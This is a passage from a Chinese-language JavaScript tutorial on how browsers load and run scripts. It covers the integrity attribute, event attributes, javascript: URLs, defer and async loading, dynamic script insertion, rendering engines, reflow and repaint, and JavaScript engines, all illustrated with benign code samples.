<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/assets/application.js&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">integrity</span>=<span class="string">&quot;sha256-TvVUHzSfftWg1rcfL6TIJ0XKEGrgLyEq6lEpcmrG9qs=&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>script</code>标签有一个<code>integrity</code>属性，指定了外部脚本<code>/assets/application.js</code>的 SHA256 签名。一旦有人改了这个脚本，导致 SHA256 签名不匹配，浏览器就会拒绝加载。</p>
<h4 id="1-3-事件属性"><a href="#1-3-事件属性" class="headerlink" title="1.3 事件属性"></a>1.3 事件属性</h4><p>网页元素的事件属性（比如<code>onclick</code>和<code>onmouseover</code>），可以写入 JavaScript 代码。当指定事件发生时，就会调用这些代码。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;myBtn&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;console.log(this.id)&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面的事件属性代码只有一个语句。如果有多个语句，使用分号分隔即可。</p>
<h4 id="1-4-URL-协议"><a href="#1-4-URL-协议" class="headerlink" title="1.4 URL 协议"></a>1.4 URL 协议</h4><p>URL 支持<code>javascript:</code>协议，即在 URL 的位置写入代码，使用这个 URL 的时候就会执行 JavaScript 代码。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:console.log(&#x27;Hello&#x27;)&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>浏览器的地址栏也可以执行<code>javascript:</code>协议。将<code>javascript:console.log(&#39;Hello&#39;)</code>放入地址栏，按回车键也会执行这段代码。</p>
<p>如果 JavaScript 代码返回一个字符串，浏览器就会新建一个文档（document），展示这个字符串的内容，原有文档的内容都会消失。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript: new Date().toLocaleTimeString();&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，用户点击链接以后，会打开一个新文档，里面有当前时间。</p>
<p>如果返回的不是字符串，那么浏览器不会新建文档，也不会跳转。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript: console.log(new Date().toLocaleTimeString())&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，用户点击链接后，网页不会跳转，只会在控制台显示当前时间。</p>
<p><code>javascript:</code>协议的常见用途是书签脚本 Bookmarklet。由于浏览器的书签保存的是一个网址，所以<code>javascript:</code>网址也可以保存在里面，用户选择这个书签的时候，就会在当前页面执行这个脚本。为了防止书签替换掉当前文档，可以在脚本前加上<code>void</code>，或者在脚本最后加上<code>void 0</code>。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript: void new Date().toLocaleTimeString();&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript: new Date().toLocaleTimeString();void 0;&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面这两种写法，点击链接后，执行代码都不会网页跳转。</p>
<h3 id="2、script-元素"><a href="#2、script-元素" class="headerlink" title="2、script 元素"></a>2、script 元素</h3><h4 id="2-1-工作原理"><a href="#2-1-工作原理" class="headerlink" title="2.1 工作原理"></a>2.1 工作原理</h4><p>浏览器加载 JavaScript 脚本，主要通过<code> &lt;script&gt; </code>元素完成。正常的网页加载流程是这样的。</p>
<ol>
<li>浏览器一边下载 HTML 网页，一边开始解析。也就是说，不等到下载完，就开始解析。</li>
<li>解析过程中，浏览器发现<code> &lt;script&gt; </code>元素，就暂停解析，把网页渲染的控制权转交给 JavaScript 引擎。</li>
<li>如果<code> &lt;script&gt; </code>元素引用了外部脚本，就下载该脚本再执行，否则就直接执行代码。</li>
<li>JavaScript 引擎执行完毕，控制权交还渲染引擎，恢复往下解析 HTML 网页。</li>
</ol>
<p>加载外部脚本时，浏览器会暂停页面渲染，等待脚本下载并执行完成后，再继续渲染。原因是 JavaScript 代码可以修改 DOM，所以必须把控制权让给它，否则会导致复杂的线程竞赛的问题。</p>
<p>如果外部脚本加载时间很长（一直无法完成下载），那么浏览器就会一直等待脚本下载完成，造成网页长时间失去响应，浏览器就会呈现“假死”状态，这被称为“阻塞效应”。</p>
<p>为了避免这种情况，较好的做法是<strong>将<code> &lt;script&gt; </code>标签都放在页面底部，而不是头部</strong>。这样即使遇到脚本失去响应，网页主体的渲染也已经完成了，用户至少可以看到内容，而不是面对一张空白的页面。如果某些脚本代码非常重要，一定要放在页面头部的话，最好直接将代码写入页面，而不是连接外部脚本文件，这样能缩短加载时间。</p>
<p>脚本文件都放在网页尾部加载，还有一个好处。因为在 DOM 结构生成之前就调用 DOM 节点，JavaScript 会报错，如果脚本都在网页尾部加载，就不存在这个问题，因为这时 DOM 肯定已经生成了。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">innerHTML</span>);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面代码执行时会报错，因为此时<code>document.body</code>元素还未生成。</p>
<p>一种解决方法是设定<code>DOMContentLoaded</code>事件的回调函数。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(</span></span><br><span class="line"><span class="language-javascript">      <span class="string">&#x27;DOMContentLoaded&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">innerHTML</span>);</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    );</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，指定<code>DOMContentLoaded</code>事件发生后，才开始执行相关代码。<code>DOMContentLoaded</code>事件只有在 DOM 结构生成之后才会触发。</p>
<p>另一种解决方法是，使用<code> &lt;script&gt; </code>标签的<code>onload</code>属性。当<code> &lt;script&gt; </code>标签指定的外部脚本文件下载和解析完成，会触发一个<code>load</code>事件，可以把所需执行的代码，放在这个事件的回调函数里面。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;jquery.min.js&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;console.log(document.body.innerHTML)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是，如果将脚本放在页面底部，就可以完全按照正常的方式写，上面两种方式都不需要。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 其他代码  --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">innerHTML</span>);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果有多个<code>script</code>标签，比如下面这样。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;a.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;b.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>浏览器会同时并行下载<code>a.js</code>和<code>b.js</code>，但是，执行时会保证先执行<code>a.js</code>，然后再执行<code>b.js</code>，即使后者先下载完成，也是如此。也就是说，脚本的执行顺序由它们在页面中的出现顺序决定，这是为了保证脚本之间的依赖关系不受到破坏。当然，加载这两个脚本都会产生“阻塞效应”，必须等到它们都加载完成，浏览器才会继续页面渲染。</p>
<p>解析和执行 CSS，也会产生阻塞。Firefox 浏览器会等到脚本前面的所有样式表，都下载并解析完，再执行脚本；Webkit则是一旦发现脚本引用了样式，就会暂停执行脚本，等到样式表下载并解析完，再恢复执行。</p>
<p>此外，对于来自同一个域名的资源，比如脚本文件、样式表文件、图片文件等，浏览器一般有限制，同时最多下载6～20个资源，即最多同时打开的 TCP 连接有限制，这是为了防止对服务器造成太大压力。如果是来自不同域名的资源，就没有这个限制。所以，<strong>通常把静态文件放在不同的域名之下，以加快下载速度</strong>。</p>
<h4 id="2-2-defer-属性-推迟执行外部js"><a href="#2-2-defer-属性-推迟执行外部js" class="headerlink" title="2.2 defer 属性 (推迟执行外部js)"></a>2.2 defer 属性 (推迟执行外部js)</h4><p>为了解决脚本文件下载阻塞网页渲染的问题，一个方法是对<code> &lt;script&gt; </code>元素加入<code>defer</code>属性。它的<strong>作用是延迟脚本的执行，等到 DOM 加载生成后，再执行脚本</strong>。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;a.js&quot;</span> <span class="attr">defer</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;b.js&quot;</span> <span class="attr">defer</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，只有等到 DOM 加载完成后，才会执行<code>a.js</code>和<code>b.js</code>。</p>
<p><code>defer</code>属性的运行流程如下。</p>
<ol>
<li>浏览器开始解析 HTML 网页。</li>
<li>解析过程中，发现带有<code>defer</code>属性的<code> &lt;script&gt; </code>元素。</li>
<li>浏览器继续往下解析 HTML 网页，同时并行下载<code> &lt;script&gt; </code>元素加载的外部脚本。</li>
<li>浏览器完成解析 HTML 网页，此时再回过头执行已经下载完成的脚本。</li>
</ol>
<p>有了<code>defer</code>属性，浏览器下载脚本文件的时候，不会阻塞页面渲染。下载的脚本文件在<code>DOMContentLoaded</code>事件触发前执行（即刚刚读取完<code>&lt;/html&gt;</code>标签），而且可以保证执行顺序就是它们在页面上出现的顺序。</p>
<p>对于内置而不是加载外部脚本的<code>script</code>标签，以及动态生成的<code>script</code>标签，<code>defer</code>属性不起作用。另外，使用<code>defer</code>加载的外部脚本不应该使用<code>document.write</code>方法。</p>
<h4 id="2-3-async-属性（异步执行外部js）"><a href="#2-3-async-属性（异步执行外部js）" class="headerlink" title="2.3 async 属性（异步执行外部js）"></a>2.3 async 属性（异步执行外部js）</h4><p>解决“阻塞效应”的另一个方法是对<code> &lt;script&gt;</code>元素加入<code>async</code>属性。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;a.js&quot;</span> <span class="attr">async</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;b.js&quot;</span> <span class="attr">async</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>async</code>属性的作用是，<strong>使用另一个进程下载脚本，下载时不会阻塞渲染</strong>。</p>
<ol>
<li>浏览器开始解析 HTML 网页。</li>
<li>解析过程中，发现带有<code>async</code>属性的<code>script</code>标签。</li>
<li>浏览器继续往下解析 HTML 网页，同时并行下载<code> &lt;script&gt;</code>标签中的外部脚本。</li>
<li>脚本下载完成，浏览器暂停解析 HTML 网页，开始执行下载的脚本。</li>
<li>脚本执行完毕，浏览器恢复解析 HTML 网页。</li>
</ol>
<p><code>async</code>属性可以保证脚本下载的同时，浏览器继续渲染。需要注意的是，一旦采用这个属性，<strong>就无法保证脚本的执行顺序</strong>。哪个脚本先下载结束，就先执行那个脚本。另外，使用<code>async</code>属性的脚本文件里面的代码，不应该使用<code>document.write</code>方法。</p>
<p><code>defer</code>属性和<code>async</code>属性到底应该使用哪一个？</p>
<p><strong>一般来说，如果脚本之间没有依赖关系，就使用<code>async</code>属性，如果脚本之间有依赖关系，就使用<code>defer</code>属性</strong>。如果同时使用<code>async</code>和<code>defer</code>属性，后者不起作用，浏览器行为由<code>async</code>属性决定。</p>
<h4 id="2-4-脚本的动态加载-（createElement-script）"><a href="#2-4-脚本的动态加载-（createElement-script）" class="headerlink" title="2.4 脚本的动态加载 （createElement script）"></a>2.4 脚本的动态加载 （createElement script）</h4><p><code>&lt;script&gt;</code>元素还可以动态生成，生成后再插入页面，从而实现脚本的动态加载。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;a.js&#x27;</span>, <span class="string">&#x27;b.js&#x27;</span>].<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">src</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">  script.<span class="property">src</span> = src;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>这种方法的好处是，动态生成的<code>script</code>标签不会阻塞页面渲染，也就不会造成浏览器假死。但是问题在于，这种方法无法保证脚本的执行顺序，哪个脚本文件先下载完成，就先执行哪个。</p>
<p>如果想避免这个问题，可以设置async属性为<code>false</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;a.js&#x27;</span>, <span class="string">&#x27;b.js&#x27;</span>].<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">src</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">  script.<span class="property">src</span> = src;</span><br><span class="line">  script.<span class="property">async</span> = <span class="literal">false</span>;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>上面的代码不会阻塞页面渲染，而且可以保证<code>b.js</code>在<code>a.js</code>后面执行。不过需要注意的是，在这段代码后面加载的脚本文件，会因此都等待<code>b.js</code>执行完成后再执行。</p>
<p>如果想为动态加载的脚本指定回调函数，可以使用下面的写法。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">loadScript</span>(<span class="params">src, done</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> js = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">  js.<span class="property">src</span> = src;</span><br><span class="line">  js.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">done</span>();</span><br><span class="line">  &#125;;</span><br><span class="line">  js.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">done</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Failed to load script &#x27;</span> + src));</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(js);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="2-5-加载使用的协议（http-or-https）"><a href="#2-5-加载使用的协议（http-or-https）" class="headerlink" title="2.5 加载使用的协议（http or https）"></a>2.5 加载使用的协议（http or https）</h4><p>如果不指定协议，浏览器默认采用 HTTP 协议下载。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;example.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面的<code>example.js</code>默认就是采用 HTTP 协议下载，如果要采用 HTTPS 协议下载，必需写明。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://example.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是有时我们会希望，根据页面本身的协议来决定加载协议，这时可以采用下面的写法。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//example.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="3、浏览器的组成"><a href="#3、浏览器的组成" class="headerlink" title="3、浏览器的组成"></a>3、浏览器的组成</h3><p>浏览器的核心是两部分：<strong>渲染引擎</strong>和 <strong>JavaScript 解释器（又称 JavaScript 引擎）</strong>。</p>
<h4 id="3-2-渲染引擎"><a href="#3-2-渲染引擎" class="headerlink" title="3.2 渲染引擎"></a>3.2 渲染引擎</h4><p>渲染引擎的主要作用是，<strong>将网页代码渲染为用户视觉可以感知的平面文档</strong>。</p>
<p>不同的浏览器有不同的渲染引擎。</p>
<ul>
<li>Firefox：Gecko 引擎</li>
<li>Safari：WebKit 引擎</li>
<li>Chrome：Blink 引擎</li>
<li>IE: Trident 引擎</li>
<li>Edge: EdgeHTML 引擎</li>
</ul>
<p>渲染引擎处理网页，通常分成四个阶段。</p>
<ol>
<li>解析代码：HTML 代码解析为 DOM，CSS 代码解析为 CSSOM（CSS Object Model）。</li>
<li>对象合成：将 DOM 和 CSSOM 合成一棵渲染树（render tree）。</li>
<li>布局：计算出渲染树的布局（layout）。</li>
<li>绘制：将渲染树绘制到屏幕。</li>
</ol>
<p>以上四步并非严格按顺序执行，往往第一步还没完成，第二步和第三步就已经开始了。所以，会看到这种情况：网页的 HTML 代码还没下载完，但浏览器已经显示出内容了。</p>
<h4 id="3-2-重流和重绘"><a href="#3-2-重流和重绘" class="headerlink" title="3.2 重流和重绘"></a>3.2 重流和重绘</h4><p><strong>渲染树转换为网页布局，称为“布局流”（flow）；布局显示到页面的这个过程，称为“绘制”（paint）</strong>。它们都具有阻塞效应，并且会耗费很多时间和计算资源。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">    1(渲染树) -- 布局流flow --&gt; 2(网页布局)</span><br><span class="line">    2 --绘制paint--&gt; 3(页面显示)</span><br></pre></td></tr></table></figure>

<p><strong>页面生成以后，脚本操作和样式表操作，都会触发“重流”（reflow）和“重绘”（repaint）</strong>。</p>
<p><strong>用户的互动也会触发重流和重绘，比如设置了鼠标悬停（<code>a:hover</code>）效果、页面滚动、在输入框中输入文本、改变窗口大小等等。</strong></p>
<p>重流和重绘并不一定一起发生，重流必然导致重绘，重绘不一定需要重流。比如改变元素颜色，只会导致重绘，而不会导致重流；改变元素的布局，则会导致重绘和重流。</p>
<p>大多数情况下，浏览器会智能判断，将重流和重绘只限制到相关的子树上面，最小化所耗费的代价，而不会全局重新生成网页。</p>
<p>作为开发者，应该尽量设法降低重绘的次数和成本。比如，尽量不要变动高层的 DOM 元素，而以底层 DOM 元素的变动代替；再比如，重绘<code>table</code>布局和<code>flex</code>布局，开销都会比较大。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;foobar&#x27;</span>);</span><br><span class="line"></span><br><span class="line">foo.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;blue&#x27;</span>;</span><br><span class="line">foo.<span class="property">style</span>.<span class="property">marginTop</span> = <span class="string">&#x27;30px&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>上面的代码只会导致一次重绘，因为浏览器会累积 DOM 变动，然后一次性执行。</p>
<p>下面是一些<strong>优化技巧</strong>。</p>
<ul>
<li>读取 DOM 或者写入 DOM，尽量写在一起，不要混杂。不要读取一个 DOM 节点，然后立刻写入，接着再读取一个 DOM 节点。</li>
<li>缓存 DOM 信息。</li>
<li>不要一项一项地改变样式，而是使用 CSS class 一次性改变样式。</li>
<li>使用<code>documentFragment</code>操作 DOM</li>
<li>动画使用<code>absolute</code>定位或<code>fixed</code>定位，这样可以减少对其他元素的影响。</li>
<li>只在必要时才显示隐藏元素。</li>
<li>使用<code>window.requestAnimationFrame()</code>，因为它可以把代码推迟到下一次重流时执行，而不是立即要求页面重流。</li>
<li>使用虚拟 DOM（virtual DOM）库。</li>
</ul>
<p>下面是一个<code>window.requestAnimationFrame()</code>对比效果的例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 重绘代价高</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">doubleHeight</span>(<span class="params">element</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> currentHeight = element.<span class="property">clientHeight</span>;</span><br><span class="line">  element.<span class="property">style</span>.<span class="property">height</span> = (currentHeight * <span class="number">2</span>) + <span class="string">&#x27;px&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">all_my_elements.<span class="title function_">forEach</span>(doubleHeight);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重绘代价低</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">doubleHeight</span>(<span class="params">element</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> currentHeight = element.<span class="property">clientHeight</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">window</span>.<span class="title function_">requestAnimationFrame</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    element.<span class="property">style</span>.<span class="property">height</span> = (currentHeight * <span class="number">2</span>) + <span class="string">&#x27;px&#x27;</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">all_my_elements.<span class="title function_">forEach</span>(doubleHeight);</span><br></pre></td></tr></table></figure>

<p>上面的第一段代码，每读一次 DOM，就写入新的值，会造成不停的重排和重流。第二段代码把所有的写操作，都累积在一起，从而 DOM 代码变动的代价就最小化了。</p>
<h4 id="3-3-JavaScript-引擎"><a href="#3-3-JavaScript-引擎" class="headerlink" title="3.3 JavaScript 引擎"></a>3.3 JavaScript 引擎</h4><p>JavaScript 引擎的主要作用是，读取网页中的 JavaScript 代码，对其处理后运行。</p>
<p>JavaScript 是一种解释型语言，也就是说，它不需要编译，由解释器实时运行。这样的好处是运行和修改都比较方便，刷新页面就可以重新解释；缺点是每次运行都要调用解释器，系统开销较大，运行速度慢于编译型语言。</p>
<p>为了提高运行速度，目前的浏览器都将 JavaScript 进行一定程度的编译，生成类似字节码（bytecode）的中间代码，以提高运行速度。</p>
<p>早期，浏览器内部对 JavaScript 的处理过程如下：</p>
<ol>
<li>读取代码，进行词法分析（Lexical analysis），将代码分解成词元（token）。</li>
<li>对词元进行语法分析（parsing），将代码整理成“语法树”（syntax tree）。</li>
<li>使用“翻译器”（translator），将代码转为字节码（bytecode）。</li>
<li>使用“字节码解释器”（bytecode interpreter），将字节码转为机器码。</li>
</ol>
<p>逐行解释将字节码转为机器码，是很低效的。为了提高运行速度，现代浏览器改为采用“即时编译”（Just In Time compiler，缩写 JIT），即字节码只在运行时编译，用到哪一行就编译哪一行，并且把编译结果缓存（inline cache）。通常，一个程序被经常用到的，只是其中一小部分代码，有了缓存的编译结果，整个程序的运行速度就会显著提升。</p>
<p>字节码不能直接运行，而是运行在一个虚拟机（Virtual Machine）之上，一般也把虚拟机称为 JavaScript 引擎。并非所有的 JavaScript 虚拟机运行时都有字节码，有的 JavaScript 虚拟机基于源码，即只要有可能，就通过 JIT（just in time）编译器直接把源码编译成机器码运行，省略字节码步骤。这一点与其他采用虚拟机（比如 Java）的语言不尽相同。这样做的目的，是为了尽可能地优化代码、提高性能。下面是目前最常见的一些 JavaScript 虚拟机：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Chakra_(JScript_engine)">Chakra</a> (Microsoft Internet Explorer)</li>
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/WebKit#JavaScriptCore">Nitro&#x2F;JavaScript Core</a> (Safari)</li>
<li><a target="_blank" rel="noopener" href="https://dev.opera.com/articles/view/labs-carakan/">Carakan</a> (Opera)</li>
<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/SpiderMonkey">SpiderMonkey</a> (Firefox)</li>
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Chrome_V8">V8</a> (Chrome, Chromium)</li>
</ul>
